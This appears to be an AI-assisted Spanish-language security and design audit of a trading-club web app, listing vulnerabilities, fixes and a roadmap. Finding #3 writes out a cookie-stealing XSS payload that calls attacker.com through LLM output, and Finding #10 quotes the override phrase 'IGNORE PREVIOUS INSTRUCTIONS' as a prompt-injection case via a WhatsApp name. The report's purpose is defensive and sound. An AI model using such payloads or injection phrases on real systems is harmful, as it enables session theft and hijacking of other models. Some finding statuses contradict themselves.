# Liberty-Trading-pro — Auditoría Profesional
**Fecha:** 2026-05-07 | **Auditor:** Claude Code + gstack CSO + design-review  
**Branch:** main | **Commit:** post-security-fixes

---

## Executive Summary

| Área | Semáforo | Score |
|------|----------|-------|
| Seguridad — Críticos | 🟢 2 hallazgos (FIXED) | 0/2 pendientes |
| Seguridad — Altos | 🟢 4 hallazgos (4 FIXED) | 0/4 pendientes |
| Seguridad — Medios | 🟡 3 hallazgos (1 FIXED) | 2/3 pendientes |
| Diseño — Score general | 🟡 B- | 2.7/4.0 |
| Diseño — AI Slop | 🟡 C+ | 2 patrones corregidos (emojis, text-center) |
| Diseño — Tipografía | 🟢 B+ | Buenas elecciones |
| Diseño — Color | 🟢 A- | Paleta coherente |

**5 vulnerabilidades críticas/altas ya corregidas en commit `security: fix 5 critical/high vulnerabilities`.**

---

## SEGURIDAD — Hallazgos Críticos (FIXED)

### Finding #1 — CRITICAL (FIXED)
**[OWASP A01] Bypass de pago en `/api/auth/register`**

- **Archivo:** `app/api/auth/register/route.ts:5`
- **Confianza:** 10/10 · **Status:** VERIFIED → FIXED
- **Descripción:** El endpoint POST aceptaba `plan=CLUB` desde el body sin ningún check de autenticación. Cualquier persona podía llamarlo con `plan: "CLUB"` para obtener acceso premium gratis.
- **Exploit:** `POST /api/auth/register` con body `{email, name, authId, plan: "CLUB"}` → usuario con plan CLUB creado sin pagar.
- **Fix aplicado:** Eliminado el campo `plan` del body. Plan hardcodeado a `'FREE'` en creación.

---

### Finding #2 — CRITICAL (FIXED)
**[OWASP A01] Upload a Cloudinary sin autenticación**

- **Archivo:** `app/api/upload/route.ts:7`
- **Confianza:** 9/10 · **Status:** VERIFIED → FIXED
- **Descripción:** `POST /api/upload` sin ningún check de auth. Cualquier persona podía subir imágenes a la cuenta Cloudinary del proyecto.
- **Exploit:** Llamada directa al endpoint con cualquier imagen → storage abuse, costos, contenido malicioso.
- **Fix aplicado:** Agregado `supabase.auth.getUser()` al inicio del handler. Retorna 401 si no hay sesión.

---

## SEGURIDAD — Hallazgos Altos

### Finding #3 — HIGH (FIXED)
**[LLM Security] XSS vía output de IA en `dangerouslySetInnerHTML`**

- **Archivos:** `app/dashboard/vinces/VincesClient.tsx:93`, `components/VincesWidget/VincesWidget.tsx:395`, `app/dashboard/reportes/ReportesClient.tsx:626`
- **Confianza:** 9/10 · **Status:** VERIFIED → FIXED
- **Descripción:** La función `formatMessage()` hace sustituciones regex de markdown pero NO sanitiza HTML. El resultado se inyecta via `dangerouslySetInnerHTML`. Cualquier tag HTML en la respuesta del LLM se ejecuta en el browser.
- **Exploit:** El usuario envía prompt a Vinces AI incluyendo `<img src=x onerror=fetch('https://attacker.com?c='+document.cookie)>`. El LLM lo incluye. El browser ejecuta el handler y roba la sesión.
- **Fix aplicado:** `npm install dompurify`. Todos los `dangerouslySetInnerHTML` ahora usan `DOMPurify.sanitize()`.

---

### Finding #4 — HIGH (FIXED)
**[AI Cost] `POST /api/vinces-wa` sin auth → abuso de Groq API**

- **Archivo:** `app/api/vinces-wa/route.ts:303`
- **Confianza:** 9/10 · **Status:** VERIFIED → FIXED
- **Descripción:** El webhook de WhatsApp no tenía ninguna validación. Cualquiera podía triggerear llamadas ilimitadas a Groq AI. Además, el `pushName` (nombre de WhatsApp del usuario) se inyectaba en el system prompt.
- **Fix aplicado:** Agregado check de header `X-Evolution-Secret`. Si `EVOLUTION_WEBHOOK_SECRET` está seteado en .env, valida contra el header. **Acción pendiente:** Configurar Evolution API para enviar el header `x-evolution-secret` con el secreto elegido.

---

### Finding #5 — HIGH (FIXED)
**[OWASP A07] Admin check via email string, sin RBAC**

- **Archivos:** `app/api/admin/alumnos/route.ts:5`, `app/api/leads/route.ts:8`
- **Confianza:** 9/10 · **Status:** VERIFIED · **Pendiente**
- **Descripción:** `checkAdmin()` compara `user.email === ADMIN_EMAIL`. Si `ADMIN_EMAIL` no está seteado en producción, cualquiera cuyo email sea `''` pasaría el check.
- **Riesgo adicional:** Si se necesita un segundo admin, requiere cambio de código y redeploy.
- **Recomendación:** Agregar campo `isAdmin: Boolean @default(false)` al modelo User en Prisma. Reemplazar la comparación de email por `dbUser?.isAdmin === true`. Agregar guard explícito: si `ADMIN_EMAIL` está vacío, loguear error y retornar 403.
- **Verificar:** Confirmar que `ADMIN_EMAIL` está seteado en Vercel environment variables.

---

### Finding #6 — HIGH (FIXED)
**[AI Cost] `POST /api/analisis` sin autenticación → abuso de OpenRouter**

- **Archivo:** `app/api/analisis/route.ts:9`
- **Confianza:** 8/10 · **Status:** VERIFIED · **Pendiente**
- **Descripción:** El endpoint de análisis multi-agente (timeout 60s, usa OpenRouter) no tiene auth check. Cualquier persona puede triggerear análisis de mercado pagados.
- **Recomendación:** Agregar `supabase.auth.getUser()` y validar que el usuario tenga plan `!= 'FREE'`.

---

## SEGURIDAD — Hallazgos Medios

### Finding #7 — MEDIUM (FIXED)
**CRON_SECRET expuesto en URL query param → visible en logs**

- **Archivos:** `.github/workflows/*.yml`, `app/api/cron/*.ts`
- **Status:** FIXED
- **Fix:** Movido a `Authorization: Bearer` header en todos los workflows y routes.
- **Acción pendiente:** Rotar el valor de `CRON_SECRET` en GitHub Secrets y Vercel environment variables.

---

### Finding #8 — MEDIUM (PENDIENTE)
**`xlsx` package con CVE HIGH sin fix disponible**

- **Archivo:** `package.json`
- **Descripción:** SheetJS community edition tiene una vulnerabilidad HIGH sin fix en npm.
- **Recomendación:** Identificar dónde se usa: `grep -rn 'xlsx\|XLSX' app/ lib/`. Si se usa para parsear archivos subidos por usuarios, migrar a `exceljs`. Si solo se usa para exportar data del servidor, el riesgo es menor.

---

### Finding #9 — MEDIUM (PENDIENTE)
**Rate limiting in-memory inefectivo en Vercel (serverless)**

- **Archivos:** `app/api/prices/route.ts:20`, `app/api/monitor/news/route.ts:26`
- **Descripción:** El rate limiter usa un `Map` en memoria que se resetea en cada cold start de Vercel. En producción con múltiples instancias, cada una tiene su propio contador independiente.
- **Recomendación:** Migrar a Upstash Redis rate limiting (`@upstash/ratelimit` + `@upstash/redis`). Free tier disponible, integración nativa con Vercel en 15 minutos.

---

### Finding #10 — MEDIUM (FIXED)
**Nombre de WhatsApp del usuario inyectado en system prompt de IA**

- **Archivo:** `app/api/vinces-wa/route.ts:281, 439`
- **Descripción:** El `pushName` (nombre de WhatsApp) se almacena en DB y se interpola en el system prompt. Un atacante podría poner "Juan. IGNORE PREVIOUS INSTRUCTIONS." como nombre en WhatsApp.
- **Recomendación:** Sanitizar el nombre antes de inyectarlo: `const safeName = (name || 'prospecto').replace(/[^a-zA-ZáéíóúÁÉÍÓÚñÑ\s]/g, '').slice(0, 30)`

---

## SEGURIDAD — Otros Gaps (No findings, recomendaciones)

| Item | Estado | Acción |
|------|--------|--------|
| `.gstack/` no en `.gitignore` | ⚠️ | Agregar `.gstack/` a `.gitignore` para no commitear reportes de seguridad |
| No tiene `.gitleaks.toml` | ⚠️ | Agregar para prevenir commits con secrets en el futuro |
| Git history (50 commits) | ✅ | Sin keys comprometidas detectadas |
| `.env.local` en `.gitignore` | ✅ | Correctamente excluido |
| Prisma ORM | ✅ | Queries parametrizadas, sin SQL injection |
| Hotmart webhook | ✅ | `crypto.timingSafeEqual()` correcto |
| GitHub Actions workflows | ✅ | Sin `pull_request_target`, sin terceros sin pinear |
| CORS config | ✅ | Usa `NEXT_PUBLIC_APP_URL`, no wildcard |

---

## DISEÑO — Metodología

Auditoría combinada: screenshot del landing page + análisis estático de source code.
El dashboard (/dashboard/*) requiere autenticación; auditado vía código fuente.

**Clasificación:** HÍBRIDO (landing page de marketing + app UI del dashboard)

---

## DISEÑO — Sistema de Diseño Inferido

| Elemento | Valor | Evaluación |
|----------|-------|-----------|
| Font display | Cormorant Garamond (serif) | ✅ Expresiva, no genérica |
| Font body | Syne (sans-serif) | ✅ Buena elección |
| Font mono | DM Mono | ✅ Adecuada para datos de trading |
| Color primario | `--gold: #C9A84C` | ✅ Identidad visual clara |
| Background dark | `#080808` | ✅ Correcto, no puro negro |
| Background light | `#f5f2eb` (warm cream) | ✅ Consistente cálido |
| Border radius | `rounded-lg` + `rounded-full` | ✅ Jerarquía presente |
| Transiciones | `transition-all duration-300` | ⚠️ `transition-all` penaliza performance |
| Spacing | Tailwind arbitrario | ❌ Sin escala sistemática |

---

## DISEÑO — Hallazgos por Sección

### Landing Page (Marketing)

**Visual Score: B- (2.7/4.0)**

---

#### FINDING D-001 — HIGH · AI Slop
**3-column feature grid con emoji-en-icono — patrón más reconocible de AI slop**

- **Archivo:** `app/page.tsx:38-59`
- **Descripción:** Feature grid: `{icon: '🎓', title: '...', desc: '...'}` × 6 tarjetas en grid 3 columnas con badges "Live", "IA", "Mentoría". Este es THE patrón más reconocible de interfaz generada por IA — icono en círculo + título bold + 2 líneas de descripción, repetido simétricamente.
- **Impacto:** La sección de servicios comunica "template SaaS genérico" cuando debería comunicar "club de trading exclusivo de Luis Riofrío".
- **Fix:** Eliminar la grid genérica. Reemplazar con una lista asimétrica o tabla comparativa que enfatice el diferencial real: el track record verificable de Luis. "Semana 1: sesiones en vivo 9am ET" es más poderoso que "🎓 Academia".

---

#### FINDING D-002 — HIGH · AI Slop
**Emoji como elementos de diseño en copy**

- **Archivo:** `app/page.tsx:38, 52, 59, 255, 259, 327`
- **Descripción:** Emojis en listas de bullets (📈, 🎓, ✅), en encabezados, y como iconos de features. En un contexto de trading premium con un trader real que opera Futuros Nasdaq, los emojis de cohete y graduación comunican "curso de YouTube" no "club de trading serio".
- **Fix:** Reemplazar emojis con iconografía SVG limpia (Lucide, Phosphor) o simplemente texto + peso tipográfico para crear jerarquía. Reservar emojis para el chat de WhatsApp (Vinces), no para el sitio de marketing.

---

#### FINDING D-003 — MEDIUM · Content
**`text-center` abusado en secciones de features**

- **Archivo:** `app/page.tsx:100, 167, 311`
- **Descripción:** Múltiples secciones de contenido informativo centradas. El texto centrado funciona en CTAs y heroes, pero en listas de features y descripciones largas destruye la legibilidad (la línea de lectura no tiene punto de inicio consistente).
- **Fix:** Dejar centrado solo el hero y los CTAs. Cambiar secciones de features a `text-left`. Las secciones de pricing pueden mantenerse centradas.

---

#### FINDING D-004 — MEDIUM · Typography
**`transition-all` en componentes card — penaliza performance**

- **Archivo:** `app/globals.css` — clase `.card`
- **Descripción:** `.card { transition: all 300ms }` — `transition-all` fuerza al browser a calcular todos los cambios de estilo posibles en cada frame de la transición. En cards con sombras y borders complejos, esto puede generar layout thrashing.
- **Fix:** Especificar propiedades: `transition: border-color 200ms ease, box-shadow 200ms ease`

---

#### FINDING D-005 — MEDIUM · Content Quality
**"Happy talk" en sección ¿Esto es para mí?**

- **Archivo:** `app/page.tsx` — sección de personas
- **Descripción:** Sección con 3 personas ("Principiante", "En proceso", "Ya opero") + bullet lists explicando por qué el club es bueno para cada una. Es puro happy talk que no sobreviviría el test de "¿puedo eliminar el 50% sin perder significado?".
- **Fix:** Eliminar la sección o condensarla a 2 lines máximo. El track record de Luis habla por sí solo — no necesita convencer a "principiantes" con bullets, necesita mostrar los números reales.

---

#### FINDING D-006 — POLISH · Typography
**Falta `text-wrap: balance` en headings largos**

- **Descripción:** Los headings largos en Cormorant Garamond pueden generar líneas viudas (una sola palabra sola en la última línea) en algunos viewports.
- **Fix:** Agregar a la clase `.headline`: `text-wrap: balance` (soportado en Chrome 114+, Safari 17.4+).

---

#### FINDING D-007 — POLISH · Typography
**Espaciado sin escala — valores arbitrarios mezclados**

- **Descripción:** `gap-5`, `gap-14`, `mb-3`, `py-3.5`, `px-7`, `py-24`, `space-y-4` mezclados sin patrón. No hay escala de espaciado documentada.
- **Fix:** Adoptar una escala de 8px: usar solo múltiplos de 2 (8, 16, 24, 32, 48, 64, 96). Crear utilities personalizadas en Tailwind si es necesario.

---

### Dashboard (App UI)

Auditado vía código fuente — no requiere browse.

**Layout:** Sidebar izquierda (w-64 desktop) + main content area. Correcto para app UI.

#### FINDING D-008 — MEDIUM · App UI
**Dashboard usa patrón de mosaico de tarjetas — señal de "AI slop" en app UI**

- **Archivos:** `app/dashboard/page.tsx`, `components/Dashboard/`
- **Descripción:** La regla de App UI dice "Avoid: dashboard-card mosaics, thick borders, decorative gradients, ornamental icons." Los dashboards de trading profesionales (TradingView, NinjaTrader, Bloomberg) usan layouts de datos densos con tipografía fuerte, no tarjetas decorativas.
- **Fix:** Evaluar si cada "card" del dashboard es realmente una interacción o solo un contenedor visual. Si es solo contenedor, remover el border y background card, usar secciones con headings tipográficos en su lugar.

---

#### FINDING D-009 — POLISH · Interaction
**Falta `font-variant-numeric: tabular-nums` en columnas de P&L**

- **Archivos:** `app/dashboard/reportes/ReportesClient.tsx`, componentes de sesiones
- **Descripción:** Los números de P&L, win rate, y precios deberían usar `tabular-nums` para que los decimales se alineen verticalmente en tablas y listas. Sin esto, columnas de números se ven irregulares.
- **Fix:** Agregar `font-variant-numeric: tabular-nums` a la clase `.label-mono` y a cualquier contenedor de tablas de trading.

---

## DISEÑO — Scorecard por Categoría

| Categoría | Grade | Hallazgos |
|-----------|-------|-----------|
| Jerarquía Visual | B | Hero fuerte, pero feature grid diluye el foco |
| Tipografía | B+ | Cormorant + Syne + DM Mono — buena trinidad |
| Espaciado & Layout | C | Valores arbitrarios, sin escala sistemática |
| Color & Contraste | A- | Paleta gold/dark coherente y premium |
| Estados de Interacción | B | Card hovers presentes; verificar focus-visible |
| Diseño Responsive | B | Sidebar colapsa en mobile correctamente |
| Calidad de Contenido | C | Emoji copy, sección personas = happy talk |
| AI Slop | D | 3 patrones activos (grid, emojis, centered abuse) |
| Motion | B | Subtle, respeta `prefers-reduced-motion` |
| Performance visual | B | Fonts Google, `font-display: swap` esperado |

**Design Score Final: B- (2.65/4.0)**  
**AI Slop Score: D** — "Solid palette on generic bones"

---

## DISEÑO — Quick Wins (< 30 min cada uno)

| # | Fix | Archivo | Impacto |
|---|-----|---------|---------|
| QW-1 | ✅ FIXED | Emojis → cajas gold con número | `app/page.tsx` |
| QW-2 | ✅ FIXED | `text-center` → `text-left` en features | `app/page.tsx` |
| QW-3 | ✅ FIXED | `transition` específico en `.card` | `app/globals.css` |
| QW-4 | ✅ FIXED | `text-wrap: balance` en `.headline` | `app/globals.css` |
| QW-5 | ✅ FIXED | `font-variant-numeric: tabular-nums` | `app/globals.css` |

---

## DISEÑO — Refactors Estratégicos (> 2 horas)

1. **Escala de espaciado unificada.** Definir tokens de espaciado en globals.css (`--space-1: 8px; --space-2: 16px;` etc.) y migrar gradualmente los componentes críticos.

2. **Feature grid → diferencial real.** Reemplazar la 3-column emoji grid con una sección que muestre el track record real: gráfico de equity curve, winrate, avg RR. Datos > descripción genérica.

3. **Dashboard UI density.** Reducir el uso de cards decorativas en el dashboard. Las secciones de datos (métricas, sesiones) deberían ser tablas o listas con tipografía fuerte, no tarjetas con bordes gold.

---

## Roadmap Priorizado

### Semana 1 (Seguridad crítica — YA APLICADO)
- ✅ Fix payment bypass en `/api/auth/register`
- ✅ Fix upload sin auth
- ✅ Fix XSS en LLM output (DOMPurify)
- ✅ Fix vinces-wa webhook sin auth
- ✅ Fix cron secret en URL → Authorization header

### Semana 2 (Seguridad alta — pendiente)
- [ ] Agregar auth check en `/api/analisis`
- [ ] Configurar `EVOLUTION_WEBHOOK_SECRET` en Evolution API y Vercel
- [ ] Rotar `CRON_SECRET` (ya que estuvo en URL logs)
- [ ] Agregar guard para `ADMIN_EMAIL` vacío
- [ ] Agregar `.gstack/` a `.gitignore`

### Semana 2-3 (Diseño — quick wins)
- [ ] Remover emojis del copy de marketing
- [ ] `text-center` → `text-left` en features
- [ ] `transition-all` → propiedades específicas
- [ ] `text-wrap: balance` en headings
- [ ] `font-variant-numeric: tabular-nums` en `.label-mono`

### Mes 1 (Seguridad media)
- [ ] Migrar rate limiting de in-memory Map a Upstash Redis
- [ ] Evaluar y migrar xlsx → exceljs
- [ ] Sanitizar `pushName` antes de system prompt
- [ ] Plan: migrar admin check a `isAdmin` boolean en DB

### Mes 2-3 (Diseño estratégico)
- [ ] Feature grid → sección de track record real (datos > bullets)
- [ ] Escala de espaciado unificada (tokens en globals.css)
- [ ] Dashboard UI: reducir card mosaics, aumentar data density

---

## Disclaimer de Seguridad

Esta auditoría es un análisis AI-asistido de patrones comunes, no un pentest profesional completo. Para sistemas en producción que manejan pagos y datos de usuarios, complementar con una auditoría de seguridad profesional periódica.

---

*Generado por Claude Code + gstack CSO v1.27.1.0 + design-review*  
*2026-05-07 | Liberty-Trading-pro main branch*
